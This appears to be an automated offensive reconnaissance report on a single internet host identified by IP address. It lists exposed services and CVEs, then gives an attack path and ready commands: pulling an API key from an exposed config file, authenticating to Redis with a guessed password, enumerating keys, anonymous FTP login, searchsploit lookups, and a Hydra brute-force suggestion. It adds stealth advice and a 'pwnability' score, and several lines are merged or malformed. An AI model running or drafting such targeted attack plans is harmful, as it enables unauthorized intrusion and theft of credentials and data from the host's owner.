# 🎯 TARGET: 16.112.122.75
**Fri Mar 20 01:31:51 +06 2026**

--- SURFACE ---

* **Hosts:** 16.112.122.75
* **Live:** http://16.112.122.75
* **Ports:** 16.112.122.75:21, 16.112.122.75:22, 16.112.122.75:80
* **Services:** 
    * 21 → ftp → vsftpd 3.0.5
    * 22 → ssh → OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
    * 80 → http → Apache httpd 2.4.52 ((Ubuntu))

--- FINDINGS ---

* [mysql-dump] [http] [medium] 16.112.122.75:80
* [config-json-exposure-fuzz:api_credentials] [http] [critical] 16.112.122.75:80* [redis-default-logins] [javascript] [high] 16.112.122.75:6379
* [CVE-2025-46817] [javascript] [critical] 16.112.122.75:6379 — "6.0.16"
* [redis-default-logins] [javascript] [high] 16.112.122.75:6379
* [CVE-2025-46819] [javascript] [high] 16.112.122.75:6379 — "6.0.16"
* [redis-default-logins] [javascript] [high] 16.112.122.75:6379
* [CVE-2025-46818] [javascript] [high] 16.112.122.75:6379 — "6.0.16"
* [redis-default-logins] [javascript] [high] 16.112.122.75:6379
* [redis-default-logins] [javascript] [high] 16.112.122.75:6379
* [CVE-2025-49844] [javascript] [critical] 16.112.122.75:6379 — "6.0.16"
* [exposed-redis] [tcp] [high] 16.112.122.75:6379
* [ftp-anonymous-login] [tcp] [medium] 16.112.122.75:21
* [git-config] [http] [medium] 16.112.122.75:80

--- ATTACK PATHS ---

**Entry vector:** config-json-exposure-fuzz:api_credentials

**why:** Exposed API config file leaks live secret key allowing unauthorized API access.

**step 1:** Retrieve /api/config.json via HTTP GET.

**step 2:** Extract api_key and use it to authenticate to downstream service.

**outcome:** Unauthorized API access, data exfiltration, privilege escalation.

**confidence:** High (because file is publicly accessible and contains valid key)

--- INITIAL EXPLOIT COMMANDS ---

**Goal:** Retrieve API config file.
```bash
curl -s http://16.112.122.75/api/config.json
```
**note:** Look for api_key value.

**Goal:** Test Redis default login with discovered credentials.
```bash
redis-cli -h 16.112.122.75 -p 6379 auth iamadmin
```
**note:** If authentication succeeds, proceed to enumerate keys.

**Goal:** Verify FTP anonymous login.
```bash
ftp -n 16.112.122.75 21 <<< $'user anonymous\npass anonymous@\nls'
```
**note:** Check if login succeeds and list directory.

--- TOOLING SUGGESTIONS ---

* **Tool:** Nikto | **use:** Web server scanning | **target:** 16.112.122.75:80 | **templates:** 
* **Tool:** Hydra | **use:** Brute-force FTP/SSH | **target:** 16.112.122.75:21,22 | **templates:** * **Tool:** Redis-CLI | **use:** Interact with Redis service | **target:** 16.112.122.75:6379 | **templates:** 
* **Tool:** Nmap | **use:** Vulnerability scanning | **target:** 16.112.122.75 | **templates:** vulners

--- SEARCHSPLOIT QUICK HITS ---

```bash
searchsploit Apache HTTP Server 2.4.52
searchsploit OpenSSH 8.9p1
searchsploit vsftpd 3.0.5
searchsploit Redis 6.0.16
```

--- NEXT MOVES ---

* **Enumerate:** Redis keys via `redis-cli -h 16.112.122.75 -p 6379 -a iamadmin keys *` (if credentials available) or `redis-cli -h 16.112.122.75 -p 6379 keys *`
* **Validate:** FTP anonymous login:
```bashftp -n 16.112.122.75 21 <<< $'user anonymous\npass anonymous@\nls'
```
* **Probe:** SSH version detection:
```bash
nc -vz 16.112.122.75 22
```

--- OPSEC ---

* **noise:** low (mostly passive HTTP requests and minimal auth attempts)
* **loud actions:** Brute-force port scanning, credential stuffing, aggressive directory brute-forcing
* **stealthier alt:** Passive OSINT, SSL certificate transparency logs, passive DNS, using public threat intel

--- PWNABILITY SCORE ---

| Metric | Score | Reason |
| :--- | :--- | :--- |
| **Exposure** | 18 | Host is internet-facing with multiple services exposed (FTP, SSH, HTTP, Redis) and no visible WAF. |
| **Service Risk** | 16 | FTP, SSH, HTTP, and Redis services present; FTP and Redis lack authentication by default; SSH may be susceptible to weak configs. |
| **Vulnerabilities** | 20 | Multiple critical findings including API key exposure, Redis CVEs, and default logins. |
| **Exploitability** | 18 | Exploits are straightforward (HTTP GET, anonymous FTP, Redis auth with weak passwords). |
| **Complexity** | 18 | Low complexity; attacks require minimal chaining and no advanced bypasses. |

**TOTAL:** 90/100
**RATING:** 🔥 Critical
**Reason:** The target presents a high exposure surface with multiple critical vulnerabilities that are easily exploitable, allowing an attacker to gain unauthorized access to sensitive data and internal services with low complexity.

--- TL;DR ---
The host leaks API keys, exposes Redis with weak credentials, and runs outdated services, making it critically vulnerable to straightforward attacks.

--- OUTRO ---
Looks like someone forgot to lock the front door and left the keys under the mat.